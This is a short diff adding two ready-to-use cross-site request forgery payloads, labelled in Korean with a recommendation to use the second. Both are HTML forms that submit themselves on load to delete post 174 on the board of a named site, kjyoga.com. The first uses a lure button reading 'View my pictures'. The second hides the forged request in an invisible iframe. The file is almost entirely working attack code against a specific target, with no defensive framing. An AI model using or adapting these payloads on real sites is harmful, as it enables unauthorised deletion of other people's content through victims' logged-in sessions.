@@ -1,0 +1,26 @@
+csrf post용
+2번째것 추천
+
+<CSRF>
+
+<body onload="document.forms[0].submit()">
+<form action="http://kjyoga.com/board/write_.html" method="POST">
+<input type="hidden" name="p_pkid" value="174"/>
+<input type="hidden" name="p_mid" value="1"/>
+<input type="hidden" name="p_code" value="del"/>
+<input type="hidden" name="p_pwd_code" value=""/>
+<input type="hidden" name="p_rturl" value="L2JvYXJkL2xpc3QuaHRtbD9wx21pZD0x"/>
+<input type="submit" value="View my pictures"/>
+</form>
+
+-------------------------------------
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://kjyoga.com/board/write_.html' target="csrf-frame" id="csrf-form">
+<input type="hidden" name="p_pkid" value="174"/>
+<input type="hidden" name="p_mid" value="1"/>
+<input type="hidden" name="p_code" value="del"/>
+<input type="hidden" name="p_pwd_code" value=""/>
+<input type="hidden" name="p_rturl" value="L2JvYXJkL2xpc3QuaHRtbD9wx21pZD0x"/>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
